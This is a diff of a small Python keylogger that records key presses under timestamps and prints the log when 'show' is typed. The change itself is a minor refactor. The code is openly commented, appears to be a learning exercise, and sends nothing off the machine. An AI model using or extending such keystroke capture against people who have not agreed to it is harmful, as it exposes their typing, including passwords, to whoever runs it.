@@ -3,10 +3,10 @@ from datetime import datetime            #Import a library that records date and
 
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
-dicti_for_show = {"all times":''}
+str_for_show = ''
 
 def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
-    global dicti_for_show,dicti
+    global str_for_show,dicti
     key = key.name
     currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
 
@@ -14,15 +14,16 @@ def on_key_press(key):                             #A function that receives inp
         dicti[currentTime] = ''
 
     dicti[currentTime] += key
-    dicti_for_show["all times"] += key
+    str_for_show += key
 
 
-    if "show" in dicti_for_show["all times"].lower():
+    if "show" in str_for_show.lower():
         for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
+            print()
             print("****",k,"****")                  #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
-            print(v,end = "\n")
+            print(v)
         dicti = {}
-        dicti_for_show = {"all times": ''}
+        str_for_show = ''
 
 
 #For checking the current file.
